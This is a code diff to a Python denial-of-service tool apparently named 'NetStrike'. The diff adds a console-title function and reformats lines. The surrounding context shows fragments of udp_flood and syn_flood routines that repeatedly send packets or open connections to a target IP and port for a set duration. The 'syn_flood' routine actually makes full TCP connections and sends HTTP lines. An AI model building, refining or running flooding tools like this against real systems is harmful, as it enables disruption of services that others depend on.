@@ -2,7 +2,18 @@ import threading
 import socket
 import random
 import time
+import sys
 import os
+
+
+def set_title(title):
+    if os.name == "nt":
+        import ctypes
+
+        ctypes.windll.kernel32.SetConsoleTitleW(title)
+    else:
+        sys.stdout.write(f"\033]0;{title}\007")
+        sys.stdout.flush()
 
 
 def udp_flood(target_ip, target_port, duration):
@@ -22,7 +33,7 @@ def udp_flood(target_ip, target_port, duration):
                 )
     except KeyboardInterrupt:
         print("Attack stopped by user (CTRL + C)")
-    
+
     udp_socket.close()
 
 
@@ -38,7 +49,8 @@ def syn_flood(target_ip, target_port, duration):
                 sock.connect((target_ip, target_port))
                 sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                 sock.sendto(
-                    b"Host: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port)
+                    b"Host: " + target_ip.encode() + b"\r\n\r\n",
+                    (target_ip, target_port),
                 )
                 sock.close()
                 packets_sent += 1
@@ -123,6 +135,8 @@ def clear():
 
 
 def main():
+    set_title("NetStrike")
+
     # Print plane
     for _ in range(50):
         for line in plane.split("\n"):
